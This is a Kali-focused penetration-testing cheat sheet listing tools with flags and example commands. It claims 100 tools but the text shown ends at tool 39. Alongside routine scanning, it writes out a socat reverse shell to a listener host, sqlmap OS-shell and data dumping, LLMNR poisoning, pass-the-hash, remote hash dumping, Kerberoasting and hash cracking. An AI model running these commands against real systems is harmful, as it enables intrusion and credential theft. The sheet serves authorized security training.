# Top 100 Security Tools Cheat Sheet

> **Volume 12 — Career Checklists & Reference Material**
> Last Updated: 2026-09-05 | Kali Linux Focused | Ethical Use Only

---

## How to Use This Cheat Sheet

This reference document covers **100 essential tools** used across every phase of a professional Vulnerability Assessment and Penetration Testing (VAPT) engagement. Tools are organized into **10 categories** that map directly to the standard pentest methodology:

| Phase | Category | Tools |
|-------|----------|-------|
| Pre-engagement | Reconnaissance & OSINT | 1–15 |
| Discovery | Web Application Testing | 16–30 |
| Network Attack | Network Pentesting | 31–45 |
| Credential Theft | Password & Credential Attacks | 46–55 |
| Exploitation | Exploitation Frameworks | 56–65 |
| Internal Movement | Active Directory | 66–75 |
| RF/Wireless | Wireless Testing | 76–80 |
| App Testing | Mobile Testing | 81–85 |
| Investigation | Forensics & DFIR | 86–95 |
| Utility | Misc/Utility | 96–100 |

**Reading Guide:**
- 📦 **Install** — command to install if not pre-installed on Kali
- 🔧 **Syntax** — core command structure
- 🏷️ **Flags** — most used flags with descriptions
- 💡 **Example** — real-world practical command

> ⚠️ **Legal Disclaimer**: All tools and techniques described herein are for authorized security testing, research, and educational purposes only. Unauthorized use against systems you do not own or have explicit written permission to test is illegal and unethical.

---

## 1. Reconnaissance & OSINT (Tools 1–15)

> Passive and active information gathering before active exploitation begins.

---

### Tool 1 — nmap (Network Mapper)

**Description:** The industry-standard open-source network scanner for host discovery, port scanning, service/version detection, and OS fingerprinting.

📦 **Install:** Pre-installed on Kali. `sudo apt install nmap`

🔧 **Syntax:** `nmap [options] <target>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-sV` | Service/version detection |
| `-O` | OS detection |
| `-p-` | Scan all 65535 ports |
| `-A` | Aggressive scan (OS, version, scripts, traceroute) |
| `--open` | Show only open ports |
| `-oN/-oX/-oG` | Output to normal / XML / greppable format |

💡 **Example:**
```bash
# Full TCP scan with version detection, OS fingerprint, and default scripts
nmap -sV -sC -O -p- --open -oN scan_results.txt 192.168.1.0/24

# Fast top-1000 port scan
nmap -T4 -F 10.10.10.5

# UDP scan (top 100 ports)
nmap -sU --top-ports 100 10.10.10.5
```

---

### Tool 2 — masscan

**Description:** Blazing-fast TCP port scanner capable of scanning the entire internet in under 6 minutes; outputs similar to nmap.

📦 **Install:** `sudo apt install masscan`

🔧 **Syntax:** `masscan <target> -p<ports> --rate=<rate>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-p` | Port or port ranges (e.g. `1-65535`) |
| `--rate` | Packets per second |
| `--banners` | Grab service banners |
| `-oX/-oL` | Output XML or list format |
| `--exclude` | Exclude specific hosts |

💡 **Example:**
```bash
# Scan entire class B for top ports at 100k pps
masscan 10.10.0.0/16 -p22,80,443,445,3389 --rate=100000 -oL masscan_out.txt

# Full 65535 port scan of single host
masscan 10.10.10.5 -p1-65535 --rate=10000
```

---

### Tool 3 — rustscan

**Description:** Ultra-fast Rust-based port scanner that hands off discovered open ports directly to nmap for service detection.

📦 **Install:** `cargo install rustscan` or download from GitHub releases.

🔧 **Syntax:** `rustscan -a <target> -- [nmap flags]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-a` | Target address |
| `-p` | Port list/range |
| `-b` | Batch size (parallel sockets) |
| `--ulimit` | Set file descriptor limit |
| `--` | Pass remaining args to nmap |

💡 **Example:**
```bash
# Scan all ports, pass to nmap for -sV -sC
rustscan -a 10.10.10.5 --ulimit 5000 -- -sV -sC -oN rustscan_out.txt

# Scan specific ports
rustscan -a 10.10.10.5 -p 22,80,443,8080 -- -A
```

---

### Tool 4 — theHarvester

**Description:** OSINT tool for gathering emails, subdomains, hosts, employee names, open ports, and banners from public sources.

📦 **Install:** Pre-installed on Kali. `pip install theHarvester`

🔧 **Syntax:** `theHarvester -d <domain> -b <source>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-d` | Domain to search |
| `-b` | Data source (google, bing, linkedin, shodan, all) |
| `-l` | Limit search results |
| `-f` | Save output to HTML/XML file |
| `-c` | Perform DNS brute-force |

💡 **Example:**
```bash
# Harvest from all sources
theHarvester -d example.com -b all -f harvest_results

# Harvest emails only via Google
theHarvester -d example.com -b google -l 500
```

---

### Tool 5 — subfinder

**Description:** Fast passive subdomain enumeration tool using multiple public APIs (VirusTotal, Shodan, Censys, etc.).

📦 **Install:** `go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest`

🔧 **Syntax:** `subfinder -d <domain> [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-d` | Target domain |
| `-o` | Output file |
| `-silent` | Suppress banner, print results only |
| `-all` | Use all sources |
| `-t` | Number of concurrent threads |

💡 **Example:**
```bash
# Passive subdomain enumeration
subfinder -d example.com -all -silent -o subs.txt

# Pipe into httpx for live probing
subfinder -d example.com -silent | httpx -silent -title -status-code
```

---

### Tool 6 — amass

**Description:** In-depth attack surface mapping and external asset discovery including DNS enumeration, network mapping, and OSINT data.

📦 **Install:** `sudo apt install amass` or `go install github.com/owasp-amass/amass/v4/...@master`

🔧 **Syntax:** `amass enum -d <domain> [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-d` | Target domain |
| `-passive` | Passive-only (no direct DNS queries) |
| `-brute` | Enable DNS brute forcing |
| `-o` | Output file |
| `-config` | Use config file (API keys) |

💡 **Example:**
```bash
# Passive enumeration
amass enum -passive -d example.com -o amass_passive.txt

# Active brute force with wordlist
amass enum -brute -d example.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt
```

---

### Tool 7 — gobuster (DNS mode)

**Description:** Fast directory/DNS/vhost brute-force tool written in Go. DNS mode discovers subdomains via brute force.

📦 **Install:** `sudo apt install gobuster`

🔧 **Syntax:** `gobuster dns -d <domain> -w <wordlist>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-d` | Target domain |
| `-w` | Wordlist path |
| `-r` | Custom DNS resolver |
| `-t` | Number of threads |
| `-o` | Output file |

💡 **Example:**
```bash
# DNS subdomain brute force
gobuster dns -d example.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -t 50 -o gobuster_dns.txt

# With custom resolver
gobuster dns -d example.com -w wordlist.txt -r 8.8.8.8
```

---

### Tool 8 — dnsx

**Description:** Fast and multi-purpose DNS toolkit with support for multiple record types, wildcard filtering, and bulk resolution.

📦 **Install:** `go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest`

🔧 **Syntax:** `dnsx -l <input> [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-l` | Input file of domains/IPs |
| `-a/-aaaa/-mx/-ns/-txt` | Query specific record types |
| `-resp` | Show response data |
| `-silent` | Suppress banner |
| `-o` | Output file |

💡 **Example:**
```bash
# Resolve subdomains from file
cat subs.txt | dnsx -silent -a -resp -o resolved.txt

# Bulk DNS record enumeration
dnsx -l domains.txt -a -aaaa -mx -ns -txt -resp -o dns_records.txt
```

---

### Tool 9 — httpx

**Description:** Fast HTTP toolkit for probing web servers, detecting technologies, status codes, titles, and content length.

📦 **Install:** `go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest`

🔧 **Syntax:** `httpx -l <input> [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-l` | Input file |
| `-title` | Display page title |
| `-status-code` | Show HTTP status code |
| `-tech-detect` | Detect web technologies |
| `-screenshot` | Capture screenshots |

💡 **Example:**
```bash
# Probe live hosts from subfinder
subfinder -d example.com -silent | httpx -silent -title -status-code -tech-detect

# Probe with screenshots
httpx -l urls.txt -screenshot -o httpx_results.txt
```

---

### Tool 10 — shodan-cli

**Description:** Command-line interface for Shodan, the search engine for internet-connected devices; queries indexed banners without active scanning.

📦 **Install:** `pip install shodan` then `shodan init <API_KEY>`

🔧 **Syntax:** `shodan <command> [options]`

🏷️ **Key Commands:**

| Command/Flag | Description |
|--------------|-------------|
| `search` | Search Shodan database |
| `host <IP>` | Get info on specific IP |
| `myip` | Get your current public IP |
| `count` | Count results for query |
| `download` | Download search results |

💡 **Example:**
```bash
# Search for Apache servers in a country
shodan search "Apache country:US" --fields ip_str,port,org

# Get detailed host info
shodan host 8.8.8.8

# Search for exposed RDP
shodan search "port:3389 product:Remote Desktop" --limit 100
```

---

### Tool 11 — whois

**Description:** Queries WHOIS databases for domain registration, registrar, nameservers, and contact information.

📦 **Install:** Pre-installed. `sudo apt install whois`

🔧 **Syntax:** `whois <domain/IP>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-H` | Hide legal disclaimers |
| `-h <host>` | Use specific WHOIS server |

💡 **Example:**
```bash
whois example.com
whois 8.8.8.8
whois -H example.com | grep -i "registrar\|creation\|expir\|name server"
```

---

### Tool 12 — dig

**Description:** DNS lookup utility for querying nameservers, performing zone transfers, and enumerating DNS records manually.

📦 **Install:** Pre-installed. `sudo apt install dnsutils`

🔧 **Syntax:** `dig [@server] <domain> [type]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `+short` | Terse output |
| `+noall +answer` | Show only the answer section |
| `AXFR` | Attempt zone transfer |
| `ANY` | Query all record types |
| `+trace` | Trace delegation path |

💡 **Example:**
```bash
# Basic A record
dig example.com A +short

# Zone transfer attempt
dig @ns1.example.com example.com AXFR

# Trace DNS path
dig example.com +trace

# Reverse lookup (PTR)
dig -x 8.8.8.8 +short
```

---

### Tool 13 — host

**Description:** Simple DNS lookup utility useful for quick forward and reverse resolution checks.

📦 **Install:** Pre-installed. Part of `bind9-host` package.

🔧 **Syntax:** `host [options] <name/IP> [server]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-t <type>` | Query type (A, MX, NS, TXT) |
| `-a` | All record types |
| `-l` | Zone transfer (list all records) |
| `-v` | Verbose output |

💡 **Example:**
```bash
host example.com
host -t MX example.com
host -l example.com ns1.example.com   # Zone transfer
host -a example.com
```

---

### Tool 14 — nslookup

**Description:** Interactive DNS query tool for both Windows and Linux; useful for quick lookups during engagements.

📦 **Install:** Pre-installed. `sudo apt install dnsutils`

🔧 **Syntax:** `nslookup [options] <domain> [server]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-type=` | Record type (A, MX, NS, TXT, ANY) |
| `-debug` | Enable debug output |
| Server IP | Use custom DNS server |

💡 **Example:**
```bash
# Query MX records
nslookup -type=MX example.com

# Use custom DNS server
nslookup example.com 8.8.8.8

# Interactive mode
nslookup
> set type=NS
> example.com
```

---

### Tool 15 — dnsrecon

**Description:** Python-based DNS enumeration script supporting zone transfer, brute force, Google/Bing lookup, cache snooping, and more.

📦 **Install:** Pre-installed on Kali. `sudo apt install dnsrecon`

🔧 **Syntax:** `dnsrecon -d <domain> -t <type>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-d` | Target domain |
| `-t` | Type: std, axfr, brt, goo, bing, snoop |
| `-D` | Dictionary file for brute force |
| `-x` | XML output file |
| `-n` | DNS server to use |

💡 **Example:**
```bash
# Standard enumeration (all record types)
dnsrecon -d example.com -t std

# Brute force subdomains
dnsrecon -d example.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Zone transfer attempt
dnsrecon -d example.com -t axfr
```

---

## 2. Web Application Testing (Tools 16–30)

> Testing and exploitation of web applications for OWASP Top 10 and beyond.

---

### Tool 16 — Burp Suite

**Description:** The gold-standard web application security testing platform with proxy, scanner, intruder, repeater, and extender.

📦 **Install:** Pre-installed on Kali. Community edition free; Professional for active scanning.

🔧 **Syntax:** GUI-based; CLI via `burpsuite`

🏷️ **Key Features:**

| Feature | Description |
|---------|-------------|
| Proxy | Intercept and modify HTTP/S traffic |
| Intruder | Automated fuzzing with payloads |
| Repeater | Manually replay and modify requests |
| Scanner | Active vulnerability scanning (Pro) |
| Extensions | Community BApp store integrations |

💡 **Example:**
```bash
# Launch Burp Suite
burpsuite &

# Use with upstream proxy for proxychains
# Set proxy to 127.0.0.1:8080 in browser
# Add target scope, then spider/scan

# Intercept with curl
curl -x http://127.0.0.1:8080 http://target.com/login \
  -d "user=admin&pass=test" -v
```

---

### Tool 17 — nikto

**Description:** Web server scanner that checks for dangerous files, outdated software, misconfigurations, and 6700+ vulnerabilities.

📦 **Install:** Pre-installed on Kali. `sudo apt install nikto`

🔧 **Syntax:** `nikto -h <target> [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-h` | Target host/URL |
| `-p` | Port number |
| `-ssl` | Force SSL |
| `-o` | Output file |
| `-Tuning` | Test tuning (0-9 categories) |

💡 **Example:**
```bash
# Basic scan
nikto -h http://10.10.10.5

# HTTPS scan with output
nikto -h https://example.com -ssl -o nikto_out.html -Format html

# Scan through Burp proxy
nikto -h http://target.com -useproxy http://127.0.0.1:8080
```

---

### Tool 18 — dirsearch

**Description:** Python-based web path scanner with recursive scanning, multiple wordlists, and smart filtering capabilities.

📦 **Install:** `sudo apt install dirsearch` or `pip install dirsearch`

🔧 **Syntax:** `dirsearch -u <url> -e <extensions>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-u` | Target URL |
| `-e` | File extensions (php,html,js) |
| `-w` | Custom wordlist |
| `-x` | Exclude status codes |
| `-r` | Recursive scanning |

💡 **Example:**
```bash
# Scan for PHP files
dirsearch -u http://10.10.10.5 -e php,html,txt -t 50

# Recursive with custom wordlist
dirsearch -u http://10.10.10.5 -w /usr/share/seclists/Discovery/Web-Content/big.txt \
  -r -e php,asp,aspx -x 404,403
```

---

### Tool 19 — ffuf (Fuzz Faster U Fool)

**Description:** Ultra-fast web fuzzer for directory, file, vhost, parameter, and header fuzzing using the FUZZ keyword.

📦 **Install:** `sudo apt install ffuf`

🔧 **Syntax:** `ffuf -u <url/FUZZ> -w <wordlist>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-u` | Target URL with FUZZ placeholder |
| `-w` | Wordlist (use FUZZ keyword to label) |
| `-mc` | Match HTTP status codes |
| `-fs` | Filter by response size |
| `-H` | Custom header |

💡 **Example:**
```bash
# Directory fuzzing
ffuf -u http://10.10.10.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt \
  -mc 200,301,302 -t 100

# Virtual host fuzzing
ffuf -u http://10.10.10.5 -H "Host: FUZZ.example.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 4242

# Parameter fuzzing
ffuf -u "http://target.com/search?FUZZ=test" -w params.txt -mc 200
```

---

### Tool 20 — gobuster (dir mode)

**Description:** Go-based directory and file brute-force scanner with speed and concurrency advantages over Perl/Python alternatives.

📦 **Install:** `sudo apt install gobuster`

🔧 **Syntax:** `gobuster dir -u <url> -w <wordlist>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-u` | Target URL |
| `-w` | Wordlist |
| `-x` | File extensions |
| `-k` | Skip TLS verification |
| `-b` | Blacklist status codes |

💡 **Example:**
```bash
# Basic directory scan
gobuster dir -u http://10.10.10.5 \
  -w /usr/share/wordlists/dirb/common.txt -t 50

# With extensions and HTTPS
gobuster dir -u https://example.com -k \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt \
  -x php,html,txt,bak -t 100 -o gobuster_dir.txt
```

---

### Tool 21 — wfuzz

**Description:** Highly flexible web application fuzzer for finding hidden resources, parameters, authentication bypasses, and injections.

📦 **Install:** `sudo apt install wfuzz` or `pip install wfuzz`

🔧 **Syntax:** `wfuzz -c -w <wordlist> --hc <codes> <url/FUZZ>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-c` | Colorized output |
| `-w` | Wordlist |
| `--hc` | Hide response codes |
| `--hl` | Hide by line count |
| `-z` | Payload type (file, range, list) |

💡 **Example:**
```bash
# Directory fuzzing
wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://target.com/FUZZ

# POST parameter fuzzing
wfuzz -c -w passwords.txt --hc 200 -d "user=admin&pass=FUZZ" http://target.com/login

# Multiple fuzzing points
wfuzz -c -z file,users.txt -z file,passwords.txt --hc 401 \
  -d "user=FUZ1Z&pass=FUZ2Z" http://target.com/login
```

---

### Tool 22 — sqlmap

**Description:** Automated SQL injection detection and exploitation tool supporting Union, Boolean, Time-based, Error-based, and Out-of-band techniques.

📦 **Install:** Pre-installed on Kali. `sudo apt install sqlmap`

🔧 **Syntax:** `sqlmap -u "<url>" [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-u` | Target URL |
| `--dbs` | Enumerate databases |
| `--dump` | Dump table data |
| `--level` | Test level (1-5) |
| `--risk` | Risk level (1-3) |
| `--os-shell` | OS shell via SQL injection |

💡 **Example:**
```bash
# Basic injection test
sqlmap -u "http://target.com/item?id=1" --dbs

# POST parameter injection
sqlmap -u "http://target.com/login" --data "user=admin&pass=test" \
  --level=3 --risk=2 --dbs

# Dump specific table
sqlmap -u "http://target.com/item?id=1" -D webapp -T users --dump

# Full OS shell
sqlmap -u "http://target.com/item?id=1" --os-shell
```

---

### Tool 23 — XSStrike

**Description:** Advanced XSS detection suite with context analysis, fuzzing, DOM analysis, crawling, and WAF bypass.

📦 **Install:** `git clone https://github.com/s0md3v/XSStrike.git && pip install -r requirements.txt`

🔧 **Syntax:** `python3 xsstrike.py -u <url>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-u` | Target URL |
| `--crawl` | Crawl target site |
| `--fuzzer` | Fuzz with payloads |
| `--data` | POST data |
| `--proxy` | Use proxy |

💡 **Example:**
```bash
# Test GET parameter
python3 xsstrike.py -u "http://target.com/search?q=test"

# Crawl and test all forms
python3 xsstrike.py -u "http://target.com" --crawl -l 3

# Test POST parameter
python3 xsstrike.py -u "http://target.com/comment" --data "comment=test"
```

---

### Tool 24 — dalfox

**Description:** Fast, powerful XSS scanner using Go with parameter analysis, blind XSS support, DOM analysis, and PoC generation.

📦 **Install:** `go install github.com/hahwul/dalfox/v2@latest`

🔧 **Syntax:** `dalfox url <target> [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `url` | Single URL mode |
| `file` | Input file mode |
| `--blind` | Blind XSS callback URL |
| `-p` | Specific parameter to test |
| `--skip-bav` | Skip basic auth check |

💡 **Example:**
```bash
# Test URL
dalfox url "http://target.com/search?q=test"

# Blind XSS with callback
dalfox url "http://target.com/search?q=test" --blind https://your-xss-hunter.com

# Pipe URLs from file
cat urls.txt | dalfox pipe --skip-bav
```

---

### Tool 25 — wafw00f

**Description:** Web Application Firewall detection and fingerprinting tool that identifies the WAF vendor in use.

📦 **Install:** `sudo apt install wafw00f` or `pip install wafw00f`

🔧 **Syntax:** `wafw00f <url>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-a` | Check all WAF signatures |
| `-v` | Verbose output |
| `-o` | Output file |
| `-f` | Output format (json, csv) |
| `-p` | Use proxy |

💡 **Example:**
```bash
# Detect WAF
wafw00f https://example.com

# Detect all matching WAFs
wafw00f https://example.com -a

# JSON output
wafw00f https://example.com -f json -o waf_detect.json
```

---

### Tool 26 — whatweb

**Description:** Web application fingerprinting scanner identifying CMS, frameworks, servers, analytics tools, and 1800+ plugins.

📦 **Install:** Pre-installed on Kali. `sudo apt install whatweb`

🔧 **Syntax:** `whatweb [options] <url>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-a` | Aggression level (1-4) |
| `--log-verbose` | Verbose log output |
| `--log-json` | JSON output |
| `-t` | Number of threads |
| `--proxy` | Use proxy |

💡 **Example:**
```bash
# Basic fingerprint
whatweb http://example.com

# Aggressive mode (more requests)
whatweb -a 3 http://example.com

# Scan CIDR range
whatweb -a 2 --log-json=whatweb.json 192.168.1.0/24
```

---

### Tool 27 — wapiti

**Description:** Black-box web vulnerability scanner for XSS, SQL injection, SSRF, XXE, file inclusion, and more.

📦 **Install:** `sudo apt install wapiti` or `pip install wapiti3`

🔧 **Syntax:** `wapiti -u <url> [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-u` | Target URL |
| `-m` | Modules to use |
| `--scope` | Scan scope |
| `-o` | Output directory |
| `-f` | Report format (html, json, xml) |

💡 **Example:**
```bash
# Full scan with HTML report
wapiti -u http://target.com -o wapiti_report/ -f html

# Specific modules only
wapiti -u http://target.com -m sql,xss,ssrf

# With authentication
wapiti -u http://target.com --auth-method basic -a "admin:password"
```

---

### Tool 28 — nuclei

**Description:** Fast, template-based vulnerability scanner with 7000+ community templates covering CVEs, misconfigs, exposures, and more.

📦 **Install:** `go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`

🔧 **Syntax:** `nuclei -u <url> [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-u` | Single target URL |
| `-l` | Target list file |
| `-t` | Template path or tag |
| `-severity` | Filter by severity (critical,high,medium) |
| `-o` | Output file |

💡 **Example:**
```bash
# Update templates first
nuclei -update-templates

# Scan single target with critical/high templates
nuclei -u http://target.com -severity critical,high -o nuclei_out.txt

# Scan from list with specific templates
nuclei -l targets.txt -t cves/ -t exposures/ -o findings.txt

# Technology-specific scan
nuclei -u http://target.com -tags wordpress,apache
```

---

### Tool 29 — arjun

**Description:** HTTP parameter discovery tool that finds hidden GET/POST parameters through fuzzing.

📦 **Install:** `pip install arjun`

🔧 **Syntax:** `arjun -u <url>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-u` | Target URL |
| `-m` | Method (GET, POST, JSON, XML) |
| `-w` | Custom wordlist |
| `-oJ` | JSON output file |
| `--stable` | Stable (slower but safer) |

💡 **Example:**
```bash
# Discover GET parameters
arjun -u http://target.com/api/search

# POST JSON parameter discovery
arjun -u http://target.com/api -m JSON

# With custom wordlist
arjun -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

---

### Tool 30 — jwt_tool

**Description:** Tool for testing, tampering, and cracking JSON Web Tokens; checks alg:none, weak secrets, injection, and more.

📦 **Install:** `git clone https://github.com/ticarpi/jwt_tool && pip3 install -r requirements.txt`

🔧 **Syntax:** `python3 jwt_tool.py <token> [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-t` | Target URL to send tampered JWT |
| `-rh` | Request header for JWT |
| `-M` | Mode (at, pb, er, etc.) |
| `-p` | Known secret to verify |
| `-C -d` | Crack with dictionary |

💡 **Example:**
```bash
# Decode and check a JWT
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...

# Test alg:none bypass
python3 jwt_tool.py <token> -X a

# Crack secret with wordlist
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# Tamper payload claim
python3 jwt_tool.py <token> -T -S hs256 -p "secret"
```

---

## 3. Network Pentesting (Tools 31–45)

> Attacking network services, protocols, and infrastructure.

---

### Tool 31 — nmap NSE Scripts

**Description:** Nmap Scripting Engine enables powerful service enumeration, vulnerability detection, and exploitation using Lua scripts.

📦 **Install:** Scripts included with nmap. Located at `/usr/share/nmap/scripts/`

🔧 **Syntax:** `nmap --script=<script> -p <port> <target>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-sC` | Run default scripts |
| `--script=vuln` | Run vulnerability detection scripts |
| `--script-args` | Pass arguments to scripts |
| `--script-help` | Get help for script |
| `--script-trace` | Trace script actions |

💡 **Example:**
```bash
# SMB vulnerability check (EternalBlue)
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.5

# HTTP enumeration
nmap --script http-enum -p 80,443 10.10.10.5

# Default scripts + version
nmap -sC -sV -p 22,80,443 10.10.10.5

# All vuln scripts
nmap --script vuln -p- 10.10.10.5
```

---

### Tool 32 — netcat (nc)

**Description:** The "Swiss-Army knife" of networking — TCP/UDP connections, port scanning, file transfer, bind/reverse shells.

📦 **Install:** Pre-installed. `sudo apt install netcat-traditional`

🔧 **Syntax:** `nc [options] <host> <port>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-l` | Listen mode |
| `-v` | Verbose |
| `-n` | No DNS resolution |
| `-e` | Execute program (traditional nc) |
| `-z` | Zero I/O (port scan mode) |

💡 **Example:**
```bash
# Reverse shell listener
nc -lvnp 4444

# Connect to service
nc 10.10.10.5 80

# Port scan
nc -zv 10.10.10.5 1-1000

# File transfer (receiver)
nc -lvnp 9999 > received_file.txt
# File transfer (sender)
nc 10.10.10.5 9999 < file_to_send.txt
```

---

### Tool 33 — socat

**Description:** Advanced relay tool for bidirectional data transfer between two streams; superior to netcat for shells and port forwarding.

📦 **Install:** `sudo apt install socat`

🔧 **Syntax:** `socat <address1> <address2>`

🏷️ **Key Address Types:**

| Address Type | Description |
|-------------|-------------|
| `TCP-LISTEN:<port>` | Listen on TCP port |
| `TCP:<host>:<port>` | Connect to TCP |
| `EXEC:<cmd>` | Execute command |
| `PTY,raw,echo=0` | Pseudo-terminal (stable shell) |
| `OPENSSL-LISTEN` | TLS encrypted listener |

💡 **Example:**
```bash
# Stable reverse shell listener
socat FILE:`tty`,raw,echo=0 TCP-LISTEN:4444

# Send reverse shell
socat TCP:10.10.14.5:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Port forward
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

# Encrypted shell
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
```

---

### Tool 34 — tcpdump

**Description:** Command-line packet analyzer for capturing and analyzing network traffic in real time.

📦 **Install:** Pre-installed. `sudo apt install tcpdump`

🔧 **Syntax:** `tcpdump [options] [filter]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-i` | Interface to listen on |
| `-w` | Write to pcap file |
| `-r` | Read from pcap file |
| `-n` | No DNS/port resolution |
| `-A` | Print packet data as ASCII |

💡 **Example:**
```bash
# Capture all traffic on eth0
sudo tcpdump -i eth0 -w capture.pcap

# Capture HTTP traffic
sudo tcpdump -i eth0 -n port 80 -A

# Filter by host
sudo tcpdump -i eth0 host 10.10.10.5 -w host_capture.pcap

# Read from file
tcpdump -r capture.pcap -n 'tcp port 445'
```

---

### Tool 35 — tshark / Wireshark

**Description:** Wireshark is the GUI packet analyzer; tshark is its CLI equivalent for scripting and headless analysis.

📦 **Install:** `sudo apt install wireshark tshark`

🔧 **Syntax:** `tshark -r <file> [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-r` | Read from pcap file |
| `-Y` | Display filter |
| `-T fields -e` | Extract specific fields |
| `-i` | Capture interface |
| `-w` | Write capture file |

💡 **Example:**
```bash
# Read and filter by HTTP
tshark -r capture.pcap -Y "http.request"

# Extract credentials from FTP
tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg

# Follow TCP stream
tshark -r capture.pcap -z follow,tcp,ascii,0

# Capture live and filter
tshark -i eth0 -Y "http.request.method == POST" -V
```

---

### Tool 36 — Responder

**Description:** LLMNR/NBT-NS/MDNS poisoner and rogue authentication server for capturing NTLMv1/v2 hashes on local networks.

📦 **Install:** Pre-installed on Kali. `sudo apt install responder`

🔧 **Syntax:** `sudo responder -I <interface> [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-I` | Network interface |
| `-w` | Start WPAD rogue proxy |
| `-r` | Enable answers for netbios |
| `-v` | Verbose mode |
| `-A` | Analyze mode (passive) |

💡 **Example:**
```bash
# Standard poison attack
sudo responder -I eth0 -wv

# Analyze mode (passive, no poisoning)
sudo responder -I eth0 -A

# Captured hashes saved to:
ls /usr/share/responder/logs/
# Crack with hashcat
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

### Tool 37 — Impacket Suite

**Description:** Python library for working with network protocols; core tools for SMB, Kerberos, LDAP, MSRPC attacks in Windows environments.

📦 **Install:** `sudo apt install python3-impacket impacket-scripts` or `pip install impacket`

🔧 **Core Tools:**

| Tool | Description |
|------|-------------|
| `psexec.py` | Remote shell via SMB pipe |
| `wmiexec.py` | Semi-interactive shell via WMI |
| `smbexec.py` | Shell via SMB service creation |
| `secretsdump.py` | Dump SAM/NTDS hashes remotely |
| `GetUserSPNs.py` | Kerberoasting |
| `GetNPUsers.py` | AS-REP Roasting |

💡 **Example:**
```bash
# PsExec style shell
impacket-psexec DOMAIN/user:password@10.10.10.5

# Pass-the-Hash
impacket-wmiexec -hashes :NTLM_HASH DOMAIN/Administrator@10.10.10.5

# Dump hashes remotely
impacket-secretsdump DOMAIN/admin:pass@10.10.10.5

# Kerberoast
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip 10.10.10.5 -request -outputfile spn_hashes.txt

# AS-REP Roast
impacket-GetNPUsers DOMAIN/ -dc-ip 10.10.10.5 -usersfile users.txt -no-pass -format hashcat
```

---

### Tool 38 — nbtscan

**Description:** NetBIOS name scanner for quickly enumerating Windows hosts on a network segment.

📦 **Install:** `sudo apt install nbtscan`

🔧 **Syntax:** `nbtscan <range>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-r` | Use source port 137 |
| `-s <sep>` | Use custom separator |
| `-v` | Verbose output |
| `-f <file>` | Input from file |

💡 **Example:**
```bash
# Scan subnet
nbtscan 192.168.1.0/24

# Verbose scan
nbtscan -v -r 192.168.1.0/24

# Output to file
nbtscan 192.168.1.0/24 > nbtscan_out.txt
```

---

### Tool 39 — enum4linux / enum4linux-ng

**Description:** Linux alternative to Windows enum.exe for enumerating SMB shares, users, groups, password policies from Windows/Samba hosts.

📦 **Install:** `sudo apt install enum4linux` | `pip install enum4linux-ng`

🔧 **Syntax:** `enum4linux-ng [options] <target>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-A` | All enumeration |
| `-U` | Enumerate users |
| `-S` | Enumerate shares |
| `-G` | Enumerate groups |
